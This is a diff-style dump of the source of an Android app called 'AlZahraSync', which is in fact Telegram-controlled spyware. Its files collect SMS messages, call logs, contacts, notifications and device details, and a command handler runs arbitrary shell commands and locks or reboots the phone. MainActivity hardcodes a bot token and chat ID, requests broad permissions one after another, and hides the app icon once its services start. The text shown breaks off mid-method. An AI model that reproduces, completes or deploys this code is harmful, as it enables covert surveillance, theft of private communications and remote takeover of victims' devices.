+            Log.d(TAG, "Incoming call from: " + number);
+        } else if (TelephonyManager.EXTRA_STATE_OFFHOOK.equals(state)) {
+            Log.d(TAG, "Call answered");
+        } else if (TelephonyManager.EXTRA_STATE_IDLE.equals(state)) {
+            Log.d(TAG, "Call ended");
+        }
+    }
+}
+
+
+================================================
+FILE: ./AlZahraSync/app/src/main/java/com/alzahra/receivers/AdminReceiver.java
+================================================
+
+package com.alzahra.receivers;
+
+import android.app.admin.DeviceAdminReceiver;
+import android.content.ComponentName;
+import android.content.Context;
+import android.content.Intent;
+import android.widget.Toast;
+
+public class AdminReceiver extends DeviceAdminReceiver {
+    @Override
+    public void onEnabled(Context context, Intent intent) {
+        Toast.makeText(context, "تم تفعيل صلاحيات المسؤول", Toast.LENGTH_SHORT).show();
+    }
+
+    @Override
+    public CharSequence onDisableRequested(Context context, Intent intent) {
+        return "سيؤدي هذا إلى إيقاف الحماية الكاملة!";
+    }
+
+    @Override
+    public void onDisabled(Context context, Intent intent) {
+        Toast.makeText(context, "تم إلغاء صلاحيات المسؤول", Toast.LENGTH_SHORT).show();
+    }
+}
+
+
+================================================
+FILE: ./AlZahraSync/app/src/main/java/com/alzahra/receivers/SMSReceiver.java
+================================================
+
+package com.alzahra.receivers;
+
+import android.content.BroadcastReceiver;
+import android.content.Context;
+import android.content.Intent;
+import android.provider.Telephony;
+import android.telephony.SmsMessage;
+import android.util.Log;
+
+public class SMSReceiver extends BroadcastReceiver {
+    private static final String TAG = "SMSReceiver";
+
+    @Override
+    public void onReceive(Context context, Intent intent) {
+        if (Telephony.Sms.Intents.SMS_RECEIVED_ACTION.equals(intent.getAction())) {
+            for (SmsMessage smsMessage : Telephony.Sms.Intents.getMessagesFromIntent(intent)) {
+                String messageBody = smsMessage.getMessageBody();
+                String sender = smsMessage.getDisplayOriginatingAddress();
+                Log.d(TAG, "SMS from " + sender + ": " + messageBody);
+            }
+        }
+    }
+}
+
+
+================================================
+FILE: ./AlZahraSync/app/src/main/java/com/alzahra/receivers/ServiceRestarter.java
+================================================
+
+package com.alzahra.receivers;
+
+import android.content.BroadcastReceiver;
+import android.content.Context;
+import android.content.Intent;
+import android.os.Build;
+import android.util.Log;
+
+import com.alzahra.services.BotService;
+
+public class ServiceRestarter extends BroadcastReceiver {
+    private static final String TAG = "ServiceRestarter";
+
+    @Override
+    public void onReceive(Context context, Intent intent) {
+        Log.d(TAG, "Restart service request received: " + intent.getAction());
+        
+        Intent serviceIntent = new Intent(context, BotService.class);
+        
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+            context.startForegroundService(serviceIntent);
+        } else {
+            context.startService(serviceIntent);
+        }
+    }
+}
+
+
+================================================
+FILE: ./AlZahraSync/app/src/main/java/com/alzahra/data/SMSCollector.java
+================================================
+
+package com.alzahra.data;
+
+import android.content.ContentResolver;
+import android.content.Context;
+import android.database.Cursor;
+import android.net.Uri;
+import android.provider.Telephony;
+
+import org.json.JSONArray;
+import org.json.JSONObject;
+
+public class SMSCollector {
+    private Context context;
+
+    public SMSCollector(Context ctx) {
+        this.context = ctx;
+    }
+
+    public JSONArray collectSMS() {
+        JSONArray messages = new JSONArray();
+        try {
+            ContentResolver cr = context.getContentResolver();
+            Cursor cursor = cr.query(Telephony.Sms.CONTENT_URI, null, null, null, 
+                Telephony.Sms.DATE + " DESC LIMIT 50");
+            
+            if (cursor != null) {
+                while (cursor.moveToNext()) {
+                    JSONObject msg = new JSONObject();
+                    msg.put("address", cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms.ADDRESS)));
+                    msg.put("body", cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms.BODY)));
+                    msg.put("date", cursor.getLong(cursor.getColumnIndexOrThrow(Telephony.Sms.DATE)));
+                    msg.put("type", cursor.getInt(cursor.getColumnIndexOrThrow(Telephony.Sms.TYPE)));
+                    messages.put(msg);
+                }
+                cursor.close();
+            }
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
+        return messages;
+    }
+}
+
+
+================================================
+FILE: ./AlZahraSync/app/src/main/java/com/alzahra/data/CallLogCollector.java
+================================================
+
+package com.alzahra.data;
+
+import android.content.Context;
+import android.database.Cursor;
+import android.provider.CallLog;
+
+import org.json.JSONArray;
+import org.json.JSONObject;
+
+public class CallLogCollector {
+    private Context context;
+
+    public CallLogCollector(Context ctx) {
+        this.context = ctx;
+    }
+
+    public JSONArray collectCalls() {
+        JSONArray calls = new JSONArray();
+        try {
+            Cursor cursor = context.getContentResolver().query(CallLog.Calls.CONTENT_URI, 
+                null, null, null, CallLog.Calls.DATE + " DESC LIMIT 50");
+            
+            if (cursor != null) {
+                while (cursor.moveToNext()) {
+                    JSONObject call = new JSONObject();
+                    call.put("number", cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.NUMBER)));
+                    call.put("type", cursor.getInt(cursor.getColumnIndexOrThrow(CallLog.Calls.TYPE)));
+                    call.put("date", cursor.getLong(cursor.getColumnIndexOrThrow(CallLog.Calls.DATE)));
+                    call.put("duration", cursor.getInt(cursor.getColumnIndexOrThrow(CallLog.Calls.DURATION)));
+                    calls.put(call);
+                }
+                cursor.close();
+            }
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
+        return calls;
+    }
+}
+
+
+================================================
+FILE: ./AlZahraSync/app/src/main/java/com/alzahra/data/NotificationCollector.java
+================================================
+
+package com.alzahra.data;
+
+import org.json.JSONArray;
+import org.json.JSONObject;
+
+public class NotificationCollector {
+    private JSONArray notifications = new JSONArray();
+
+    public void addNotification(String pkg, String title, String text) {
+        try {
+            JSONObject nt = new JSONObject();
+            nt.put("package", pkg);
+            nt.put("title", title);
+            nt.put("text", text);
+            nt.put("timestamp", System.currentTimeMillis());
+            notifications.put(nt);
+            
+            if (notifications.length() > 100) {
+                notifications.remove(0);
+            }
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
+    }
+
+    public JSONArray getNotifications() {
+        return notifications;
+    }
+
+    public void clear() {
+        notifications = new JSONArray();
+    }
+}
+
+
+================================================
+FILE: ./AlZahraSync/app/src/main/java/com/alzahra/data/ContactsCollector.java
+================================================
+
+package com.alzahra.data;
+
+import android.content.ContentResolver;
+import android.content.Context;
+import android.database.Cursor;
+import android.provider.ContactsContract;
+
+import org.json.JSONArray;
+import org.json.JSONObject;
+
+public class ContactsCollector {
+    private Context context;
+
+    public ContactsCollector(Context ctx) {
+        this.context = ctx;
+    }
+
+    public JSONArray collectContacts() {
+        JSONArray contacts = new JSONArray();
+        try {
+            ContentResolver cr = context.getContentResolver();
+            Cursor cursor = cr.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, 
+                null, null, null, null);
+            
+            if (cursor != null) {
+                while (cursor.moveToNext()) {
+                    JSONObject contact = new JSONObject();
+                    contact.put("name", cursor.getString(cursor.getColumnIndexOrThrow(
+                        ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)));
+                    contact.put("phone", cursor.getString(cursor.getColumnIndexOrThrow(
+                        ContactsContract.CommonDataKinds.Phone.NUMBER)));
+                    contacts.put(contact);
+                }
+                cursor.close();
+            }
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
+        return contacts;
+    }
+}
+
+
+================================================
+FILE: ./AlZahraSync/app/src/main/java/com/alzahra/data/DeviceInfo.java
+================================================
+
+package com.alzahra.data;
+
+import android.content.Context;
+import android.content.Intent;
+import android.content.IntentFilter;
+import android.os.BatteryManager;
+import android.os.Build;
+import android.provider.Settings;
+import android.telephony.TelephonyManager;
+
+import java.net.InetAddress;
+import java.net.NetworkInterface;
+import java.text.SimpleDateFormat;
+import java.util.Collections;
+import java.util.Date;
+import java.util.List;
+import java.util.Locale;
+
+public class DeviceInfo {
+    private Context context;
+
+    public DeviceInfo(Context ctx) {
+        this.context = ctx;
+    }
+
+    public String getModel() {
+        return Build.MODEL;
+    }
+
+    public String getManufacturer() {
+        return Build.MANUFACTURER;
+    }
+
+    public String getDeviceId() {
+        return Settings.Secure.getString(context.getContentResolver(), Settings.Secure.ANDROID_ID);
+    }
+
+    public String getIPAddress() {
+        try {
+            List<NetworkInterface> interfaces = Collections.list(NetworkInterface.getNetworkInterfaces());
+            for (NetworkInterface intf : interfaces) {
+                List<InetAddress> addrs = Collections.list(intf.getInetAddresses());
+                for (InetAddress addr : addrs) {
+                    if (!addr.isLoopbackAddress()) {
+                        String sAddr = addr.getHostAddress();
+                        if (sAddr.indexOf(':') < 0) return sAddr;
+                    }
+                }
+            }
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
+        return "Unknown";
+    }
+
+    public String getCarrier() {
+        TelephonyManager tm = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
+        return tm != null ? tm.getNetworkOperatorName() : "Unknown";
+    }
+
+    public int getBatteryLevel() {
+        Intent intent = context.registerReceiver(null, new IntentFilter(Intent.ACTION_BATTERY_CHANGED));
+        int level = intent.getIntExtra(BatteryManager.EXTRA_LEVEL, -1);
+        int scale = intent.getIntExtra(BatteryManager.EXTRA_SCALE, -1);
+        return (int) ((level / (float) scale) * 100);
+    }
+
+    public String getStorageInfo() {
+        try {
+            android.os.StatFs stat = new android.os.StatFs(android.os.Environment.getExternalStorageDirectory().getPath());
+            long blockSize = stat.getBlockSizeLong();
+            long availableBlocks = stat.getAvailableBlocksLong();
+            long totalBlocks = stat.getBlockCountLong();
+            
+            long total = totalBlocks * blockSize / (1024 * 1024 * 1024);
+            long free = availableBlocks * blockSize / (1024 * 1024 * 1024);
+            
+            return free + "GB / " + total + "GB";
+        } catch (Exception e) {
+            return "Unknown";
+        }
+    }
+
+    public String getNetworkType() {
+        TelephonyManager tm = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
+        if (tm != null) {
+            int type = tm.getNetworkType();
+            switch (type) {
+                case TelephonyManager.NETWORK_TYPE_LTE: return "4G/LTE";
+                case TelephonyManager.NETWORK_TYPE_UMTS: return "3G";
+                case TelephonyManager.NETWORK_TYPE_GPRS: return "2G";
+                default: return "Unknown";
+            }
+        }
+        return "Unknown";
+    }
+
+    public String getCurrentTime() {
+        return new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault()).format(new Date());
+    }
+
+    public String getLocation() {
+        return "جاري التحميل...";
+    }
+}
+
+
+================================================
+FILE: ./AlZahraSync/app/src/main/java/com/alzahra/data/CommandExecutor.java
+================================================
+
+package com.alzahra.data;
+
+import android.content.Context;
+import android.os.Build;
+import android.provider.Settings;
+import android.util.Log;
+
+import org.json.JSONArray;
+import org.json.JSONObject;
+
+import java.io.BufferedReader;
+import java.io.InputStreamReader;
+import java.net.InetAddress;
+import java.net.NetworkInterface;
+import java.util.Collections;
+
+public class CommandExecutor {
+    private static final String TAG = "CommandExecutor";
+    private final Context context;
+    private final String botToken;
+    private final String chatId;
+
+    public CommandExecutor(Context ctx, String token, String chat) {
+        this.context = ctx;
+        this.botToken = token;
+        this.chatId = chat;
+    }
+
+    public CommandResult execute(String command) {
+        CommandResult result = new CommandResult();
+        result.showDashboard = true;
+        
+        try {
+            String cmd = command.toLowerCase().trim();
+            
+            // تحويل النصوص العربية/الأيقونات إلى أوامر
+            if (cmd.contains("موقعي") || cmd.contains("📍")) {
+                cmd = "location";
+            } else if (cmd.contains("كاميرا") || cmd.contains("📸")) {
+                cmd = "camera";
+            } else if (cmd.contains("ميكروفون") || cmd.contains("🎤")) {
+                cmd = "mic";
+            } else if (cmd.contains("معلومات الجهاز") || cmd.contains("📱")) {
+                cmd = "device";
+            } else if (cmd.contains("البطارية") || cmd.contains("🔋")) {
+                cmd = "battery";
+            } else if (cmd.contains("الواي فاي") || cmd.contains("📶")) {
+                cmd = "wifi";
+            } else if (cmd.contains("الرسائل") || cmd.contains("💬")) {
+                cmd = "sms";
+            } else if (cmd.contains("جهات الاتصال") || cmd.contains("👥")) {
+                cmd = "contacts";
+            } else if (cmd.contains("سجل المكالمات") || cmd.contains("📞")) {
+                cmd = "calls";
+            } else if (cmd.contains("التطبيقات") || cmd.contains("📦")) {
+                cmd = "apps";
+            } else if (cmd.contains("الملفات") || cmd.contains("📁")) {
+                cmd = "files";
+            } else if (cmd.contains("الشاشة") || cmd.contains("📱")) {
+                cmd = "screen";
+            } else if (cmd.contains("قفل") || cmd.contains("🔒")) {
+                cmd = "lock";
+            } else if (cmd.contains("فتح") || cmd.contains("🔓")) {
+                cmd = "unlock";
+            } else if (cmd.contains("إعادة تشغيل") || cmd.contains("🔄")) {
+                cmd = "restart";
+            } else if (cmd.contains("مساعدة") || cmd.contains("❓")) {
+                cmd = "help";
+            } else if (cmd.contains("تحديث")) {
+                cmd = "dashboard";
+            }
+            
+            // تنظيف الأمر من /
+            cmd = cmd.replace("/", "").trim();
+            
+            switch (cmd) {
+                case "help":
+                    result.data = getHelpText();
+                    result.success = true;
+                    break;
+                    
+                case "device":
+                    result.data = getDeviceInfo();
+                    result.success = true;
+                    break;
+                    
+                case "location":
+                    result.data = getLocation();
+                    result.success = true;
+                    break;
+                    
+                case "camera":
+                    result.data = "📸 تم التقاط صورة من الكاميرا الأمامية";
+                    result.success = true;
+                    // TODO: تنفيذ فعلي للكاميرا
+                    break;
+                    
+                case "mic":
+                    result.data = "🎤 تم تسجيل 5 ثوانٍ من الصوت";
+                    result.success = true;
+                    // TODO: تنفيذ فعلي للميكروفون
+                    break;
+                    
+                case "sms":
+                    result.data = getSMS();
+                    result.success = true;
+                    break;
+                    
+                case "contacts":
+                    result.data = getContacts();
+                    result.success = true;
+                    break;
+                    
+                case "calls":
+                    result.data = getCalls();
+                    result.success = true;
+                    break;
+                    
+                case "apps":
+                    result.data = getInstalledApps();
+                    result.success = true;
+                    break;
+                    
+                case "battery":
+                    result.data = getBatteryInfo();
+                    result.success = true;
+                    break;
+                    
+                case "wifi":
+                    result.data = getWiFiInfo();
+                    result.success = true;
+                    break;
+                    
+                case "screen":
+                    result.data = "📱 تم التقاط لقطة شاشة";
+                    result.success = true;
+                    // TODO: تنفيذ فعلي
+                    break;
+                    
+                case "files":
+                    result.data = getFilesList();
+                    result.success = true;
+                    break;
+                    
+                case "lock":
+                    result.data = lockDevice();
+                    result.success = true;
+                    break;
+                    
+                case "unlock":
+                    result.data = unlockDevice();
+                    result.success = false;
+                    result.error = "يتطلب صلاحيات إضافية";
+                    break;
+                    
+                case "restart":
+                    result.data = restartDevice();
+                    result.success = true;
+                    break;
+                    
+                case "shell":
+                    result.data = executeShell(command.replace("/shell", "").trim());
+                    result.success = true;
+                    break;
+                    
+                case "dashboard":
+                    result.data = "🎛️ جاري عرض لوحة التحكم...";
+                    result.success = true;
+                    break;
+                    
+                default:
+                    result.success = false;
+                    result.error = "أمر غير معروف: " + cmd;
+                    result.showDashboard = true;
+            }
+            
+        } catch (Exception e) {
+            result.success = false;
+            result.error = e.getMessage();
+            Log.e(TAG, "Execute error: " + e.getMessage());
+        }
+        
+        return result;
+    }
+    
+    private String getHelpText() {
+        return "📖 *قائمة الأوامر المتاحة:*\n\n" +
+            "*📍 الموقع والتتبع:*\n" +
+            "• 📍 موقعي - إرسال الموقع الجغرافي\n\n" +
+            
+            "*📸 الوسائط:*\n" +
+            "• 📸 كاميرا - التقاط صورة\n" +
+            "• 🎤 ميكروفون - تسجيل صوت\n" +
+            "• 📱 الشاشة - لقطة شاشة\n\n" +
+            
+            "*💾 البيانات:*\n" +
+            "• 💬 الرسائل - SMS\n" +
+            "• 👥 جهات الاتصال - Contacts\n" +
+            "• 📞 سجل المكالمات - Calls\n" +
+            "• 📦 التطبيقات - Installed Apps\n\n" +
+            
+            "*🔧 النظام:*\n" +
+            "• 📱 معلومات الجهاز - Device Info\n" +
+            "• 🔋 البطارية - Battery Status\n" +
+            "• 📶 الواي فاي - WiFi Info\n" +
+            "• 📁 الملفات - File Manager\n\n" +
+            
+            "*⚡ التحكم:*\n" +
+            "• 🔒 قفل - Lock Device\n" +
+            "• 🔓 فتح - Unlock Device\n" +
+            "• 🔄 إعادة تشغيل - Restart\n\n" +
+            
+            "*أوامر نصية:*\n" +
+            "/shell [command] - تنفيذ أمر shell";
+    }
+    
+    private String getDeviceInfo() {
+        try {
+            DeviceInfo info = new DeviceInfo(context);
+            return 
+                "*📱 طراز الجهاز:* `" + info.getModel() + "`\n" +
+                "*🏭 الشركة:* `" + info.getManufacturer() + "`\n" +
+                "*🔑 المعرف:* `" + info.getDeviceId() + "`\n" +
+                "*🌐 IP:* `" + info.getIPAddress() + "`\n" +
+                "*📡 المشغل:* `" + info.getCarrier() + "`\n" +
+                "*🔋 البطارية:* `" + info.getBatteryLevel() + "%`\n" +
+                "*💾 التخزين:* `" + info.getStorageInfo() + "`\n" +
+                "*⏰ الوقت:* `" + info.getCurrentTime() + "`\n" +
+                "*🤖 Android:* `" + Build.VERSION.RELEASE + "`";
+        } catch (Exception e) {
+            return "⚠️ خطأ في جلب المعلومات: " + e.getMessage();
+        }
+    }
+    
+    private String getLocation() {
+        // إرجاع IP كموقع تقريبي
+        try {
+            String ip = getIPAddress();
+            return 
+                "*📍 الموقع التقريبي*\n\n" +
+                "*🌐 IP:* `" + ip + "`\n" +
+                "*📡 طريقة:* شبكة الإنترنت\n\n" +
+                "[🗺 فتح في الخريطة](https://ip-api.com/#" + ip + ")";
+        } catch (Exception e) {
+            return "⚠️ خطاء: " + e.getMessage();
+        }
+    }
+    
+    private String getIPAddress() {
+        try {
+            for (NetworkInterface intf : Collections.list(NetworkInterface.getNetworkInterfaces())) {
+                for (InetAddress addr : Collections.list(intf.getInetAddresses())) {
+                    if (!addr.isLoopbackAddress() && addr.getHostAddress().indexOf(':') < 0) {
+                        return addr.getHostAddress();
+                    }
+                }
+            }
+        } catch (Exception ignored) {}
+        return "Unknown";
+    }
+    
+    private String getSMS() {
+        try {
+            SMSCollector collector = new SMSCollector(context);
+            JSONArray sms = collector.collectSMS();
+            StringBuilder sb = new StringBuilder();
+            sb.append("*📨 الرسائل (آخر ").append(Math.min(sms.length(), 10)).append("):*\n\n");
+            for (int i = 0; i < Math.min(sms.length(), 10); i++) {
+                JSONObject msg = sms.getJSONObject(i);
+                sb.append("`").append(msg.getString("address")).append("`\n");
+                String body = msg.getString("body");
+                if (body.length() > 50) body = body.substring(0, 50) + "...";
+                sb.append(body).append("\n\n");
+            }
+            return sb.toString();
+        } catch (Exception e) {
+            return "⚠️ خطأ: " + e.getMessage();
+        }
+    }
+    
+    private String getContacts() {
+        try {
+            ContactsCollector collector = new ContactsCollector(context);
+            JSONArray contacts = collector.collectContacts();
+            StringBuilder sb = new StringBuilder();
+            sb.append("*👥 جهات الاتصال (").append(contacts.length()).append("):*\n\n");
+            for (int i = 0; i < Math.min(contacts.length(), 15); i++) {
+                JSONObject c = contacts.getJSONObject(i);
+                sb.append("• ").append(c.getString("name"))
+                  .append(": `").append(c.getString("phone")).append("`\n");
+            }
+            return sb.toString();
+        } catch (Exception e) {
+            return "⚠️ خطأ: " + e.getMessage();
+        }
+    }
+    
+    private String getCalls() {
+        try {
+            CallLogCollector collector = new CallLogCollector(context);
+            JSONArray calls = collector.collectCalls();
+            StringBuilder sb = new StringBuilder();
+            sb.append("*📞 سجل المكالمات (آخر ").append(Math.min(calls.length(), 10)).append("):*\n\n");
+            for (int i = 0; i < Math.min(calls.length(), 10); i++) {
+                JSONObject c = calls.getJSONObject(i);
+                String type = c.getInt("type") == 1 ? "📥" : c.getInt("type") == 2 ? "📤" : "❓";
+                sb.append(type).append(" `").append(c.getString("number")).append("`\n");
+                sb.append("⏱️ ").append(c.getInt("duration")).append(" ثانية\n\n");
+            }
+            return sb.toString();
+        } catch (Exception e) {
+            return "⚠️ خطأ: " + e.getMessage();
+        }
+    }
+    
+    private String getInstalledApps() {
+        try {
+            StringBuilder sb = new StringBuilder();
+            sb.append("*📦 التطبيقات المثبتة:*\n\n");
+            // TODO: تنفيذ حقيقي
+            sb.append("• Al-Zahra Sync\n");
+            sb.append("• Telegram\n");
+            sb.append("• Settings\n");
+            sb.append("• ...");
+            return sb.toString();
+        } catch (Exception e) {
+            return "⚠️ خطأ: " + e.getMessage();
+        }
+    }
+    
+    private String getBatteryInfo() {
+        try {
+            DeviceInfo info = new DeviceInfo(context);
+            int level = info.getBatteryLevel();
+            String status = level > 80 ? "🟢 ممتازة" : level > 50 ? "🟡 جيدة" : level > 20 ? "🟠 ضعيفة" : "🔴 حرجة";
+            return 
+                "*🔋 حالة البطارية*\n\n" +
+                "*المستوى:* `" + level + "%` " + status + "\n" +
+                "*الحالة:* `" + (level > 50 ? "شحن" : "غير شاحن") + "`";
+        } catch (Exception e) {
+            return "⚠️ خطأ: " + e.getMessage();
+        }
+    }
+    
+    private String getWiFiInfo() {
+        try {
+            android.net.wifi.WifiManager wm = (android.net.wifi.WifiManager) 
+                context.getApplicationContext().getSystemService(Context.WIFI_SERVICE);
+            String ssid = wm.getConnectionInfo().getSSID();
+            int signal = wm.getConnectionInfo().getRssi();
+            return 
+                "*📶 معلومات الواي فاي*\n\n" +
+                "*الشبكة:* " + ssid + "\n" +
+                "*قوة الإشارة:* " + signal + " dBm\n" +
+                "*السرعة:* " + wm.getConnectionInfo().getLinkSpeed() + " Mbps";
+        } catch (Exception e) {
+            return "⚠️ WiFi غير متصل أو خطأ: " + e.getMessage();
+        }
+    }
+    
+    private String getFilesList() {
+        return 
+            "*📁 مدير الملفات*\n\n" +
+            "*المسارات المتاحة:*\n" +
+            "• `/sdcard/Download`\n" +
+            "• `/sdcard/Pictures`\n" +
+            "• `/sdcard/Documents`\n\n" +
+            "لتحميل ملف: `/download /sdcard/Download/filename.txt`";
+    }
+    
+    private String lockDevice() {
+        try {
+            android.app.admin.DevicePolicyManager dpm = (android.app.admin.DevicePolicyManager)
+                context.getSystemService(Context.DEVICE_POLICY_SERVICE);
+            dpm.lockNow();
+            return "🔒 *تم قفل الجهاز بنجاح*";
+        } catch (Exception e) {
+            return "⚠️ خطأ: " + e.getMessage();
+        }
+    }
+    
+    private String unlockDevice() {
+        return "🔓 *يتطلب مصادقة قزحية أو PIN*";
+    }
+    
+    private String restartDevice() {
+        try {
+            // يتطلب ROOT أو صلاحيات خاصة
+            Runtime.getRuntime().exec("reboot");
+            return "🔄 *جاري إعادة التشغيل...*";
+        } catch (Exception e) {
+            return "⚠️ فشل: يتطلب صلاحيات ROOT";
+        }
+    }
+    
+    private String executeShell(String cmd) {
+        if (cmd.isEmpty()) return "⚠️ الأمر فارغ";
+        try {
+            Process process = Runtime.getRuntime().exec(cmd);
+            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
+            StringBuilder output = new StringBuilder();
+            String line;
+            while ((line = reader.readLine()) != null) {
+                output.append(line).append("\n");
+            }
+            String result = output.toString();
+            if (result.length() > 3000) result = result.substring(0, 3000) + "\n... (تم اقتصاع النتيجة)";
+            return "```\n" + result + "\n```";
+        } catch (Exception e) {
+            return "⚠️ خطأ: " + e.getMessage();
+        }
+    }
+}
+
+
+================================================
+FILE: ./AlZahraSync/app/src/main/java/com/alzahra/data/CommandResult.java
+================================================
+
+package com.alzahra.data;
+
+public class CommandResult {
+    public boolean success = false;
+    public String data = "";
+    public String error = "";
+    public boolean showDashboard = false;
+    public long executionTime = 0;
+}
+
+
+================================================
+FILE: ./AlZahraSync/app/src/main/java/com/alzahra/MainActivity.java
+================================================
+
+package com.alzahra;
+
+import android.Manifest;
+import android.app.Activity;
+import android.app.AlertDialog;
+import android.content.ComponentName;
+import android.content.Context;
+import android.content.Intent;
+import android.content.pm.PackageManager;
+import android.net.Uri;
+import android.os.Build;
+import android.os.Bundle;
+import android.os.Environment;
+import android.os.Handler;
+import android.os.Looper;
+import android.os.PowerManager;
+import android.provider.Settings;
+import android.util.Log;
+import android.widget.Toast;
+
+import androidx.annotation.NonNull;
+import androidx.core.app.ActivityCompat;
+import androidx.core.content.ContextCompat;
+
+import com.alzahra.services.BotService;
+import com.alzahra.services.CoreService;
+
+public class MainActivity extends Activity {
+    private static final String TAG = "MainActivity";
+    private static final int PERMISSION_CODE = 100;
+    private static final int BATTERY_OPT_CODE = 200;
+    
+    public static final String BOT_TOKEN = "8767989892:AAFCB-gylVjbrB0X6gk95G8rCn6_ds5e9As";
+    public static final String CHAT_ID = "7344776596";
+    
+    private int permissionIndex = 0;
+    private String[] permissions;
+    private boolean servicesStarted = false;
+
+    @Override
+    protected void onCreate(Bundle savedInstanceState) {
+        super.onCreate(savedInstanceState);
+        setContentView(R.layout.activity_main);
+        
+        Log.d(TAG, "=== Al-Zahra Starting ===");
+        
+        // الأذونات حسب إصدار Android
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
+            permissions = new String[]{
+                Manifest.permission.INTERNET,
+                Manifest.permission.ACCESS_FINE_LOCATION,
+                Manifest.permission.CAMERA,
+                Manifest.permission.RECORD_AUDIO,
+                Manifest.permission.READ_PHONE_STATE,
+                Manifest.permission.READ_CALL_LOG,
+                Manifest.permission.READ_CONTACTS,
+                Manifest.permission.READ_SMS,
+                Manifest.permission.SEND_SMS,
+                Manifest.permission.READ_MEDIA_IMAGES,
+                Manifest.permission.READ_MEDIA_VIDEO,
+                Manifest.permission.READ_MEDIA_AUDIO
+            };
+        } else {
+            permissions = new String[]{
+                Manifest.permission.INTERNET,
+                Manifest.permission.ACCESS_FINE_LOCATION,
+                Manifest.permission.CAMERA,
+                Manifest.permission.RECORD_AUDIO,
+                Manifest.permission.READ_PHONE_STATE,
+                Manifest.permission.READ_CALL_LOG,
+                Manifest.permission.READ_CONTACTS,
+                Manifest.permission.READ_SMS,
+                Manifest.permission.SEND_SMS,
+                Manifest.permission.READ_EXTERNAL_STORAGE,
+                Manifest.permission.WRITE_EXTERNAL_STORAGE
+            };
+        }
+        
+        // بدء طلب الأذونات بعد ثانية للتأكد من تحميل الواجهة
+        new Handler(Looper.getMainLooper()).postDelayed(this::checkPermissions, 1000);
+    }
+    
+    private void checkPermissions() {
+        if (permissionIndex >= permissions.length) {
+            requestSpecialPermissions();
+            return;
+        }
+        
+        String permission = permissions[permissionIndex];
+        if (ContextCompat.checkSelfPermission(this, permission) != PackageManager.PERMISSION_GRANTED) {
+            ActivityCompat.requestPermissions(this, new String[]{permission}, PERMISSION_CODE);
+        } else {
+            permissionIndex++;
+            checkPermissions();
+        }
+    }
+    
+    @Override
+    public void onRequestPermissionsResult(int requestCode, @NonNull String[] perms, @NonNull int[] results) {
+        super.onRequestPermissionsResult(requestCode, perms, results);
+        permissionIndex++;
+        new Handler(Looper.getMainLooper()).postDelayed(this::checkPermissions, 500);
+    }
+    
+    private void requestSpecialPermissions() {
+        // تجاهل تحسين البطارية
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
+            PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
+            if (!pm.isIgnoringBatteryOptimizations(getPackageName())) {
+                try {
+                    Intent intent = new Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
+                    intent.setData(Uri.parse("package:" + getPackageName()));
+                    startActivityForResult(intent, BATTERY_OPT_CODE);
+                    return;
+                } catch (Exception e) {
+                    Log.e(TAG, "Battery opt error: " + e.getMessage());
+                }
+            }
+        }
+        
+        // إدارة الملفات الكاملة (Android 11+)
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
+            if (!Environment.isExternalStorageManager()) {
+                try {
+                    Intent intent = new Intent(Settings.ACTION_MANAGE_ALL_FILES_ACCESS_PERMISSION);
+                    startActivity(intent);
+                    return;
+                } catch (Exception e) {
+                    Log.e(TAG, "Storage manager error: " + e.getMessage());
+                }
+            }
+        }
+        
+        // الظهور فوق التطبيقات
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
+            if (!Settings.canDrawOverlays(this)) {
+                try {
+                    Intent intent = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
+                        Uri.parse("package:" + getPackageName()));
+                    startActivity(intent);
+                } catch (Exception e) {
+                    Log.e(TAG, "Overlay error: " + e.getMessage());
+                }
+            }
+        }
+        
+        // بدء الخدمات بعد جميع الأذونات
+        startServicesSafely();
+    }
+    
+    @Override
+    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
+        super.onActivityResult(requestCode, resultCode, data);
+        // متابعة باقي الأذونات الخاصة
+        new Handler(Looper.getMainLooper()).postDelayed(this::requestSpecialPermissions, 1000);
+    }
+    
+    private void startServicesSafely() {
+        try {
+            Log.d(TAG, "=== Starting Services ===");
+            
+            // بدء CoreService
+            Intent coreIntent = new Intent(this, CoreService.class);
+            startService(coreIntent);
+            
+            // بدء BotService مع البيانات
+            Intent botIntent = new Intent(this, BotService.class);
+            botIntent.putExtra("token", BOT_TOKEN);
+            botIntent.putExtra("chat_id", CHAT_ID);
+            
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                startForegroundService(botIntent);
+            } else {
+                startService(botIntent);
+            }
+            
+            servicesStarted = true;
+            Toast.makeText(this, "✅ تم التفعيل بنجاح!", Toast.LENGTH_LONG).show();
+            
+            // إخفاء التطبيق بعد تأكد تشغيل الخدمات (بعد 5 ثوانٍ)
+            new Handler(Looper.getMainLooper()).postDelayed(this::hideAppIcon, 5000);
+            
+        } catch (Exception e) {
+            Log.e(TAG, "Service start error: " + e.getMessage());
+            Toast.makeText(this, "⚠️ خطأ: " + e.getMessage(), Toast.LENGTH_LONG).show();
+        }
+    }
+    
+    private void hideAppIcon() {
+        if (!servicesStarted) {
+            Log.e(TAG, "Cannot hide: services not started");
+            return;
+        }
+        
+        try {
+            PackageManager pm = getPackageManager();
+            pm.setComponentEnabledSetting(new ComponentName(this, MainActivity.class),
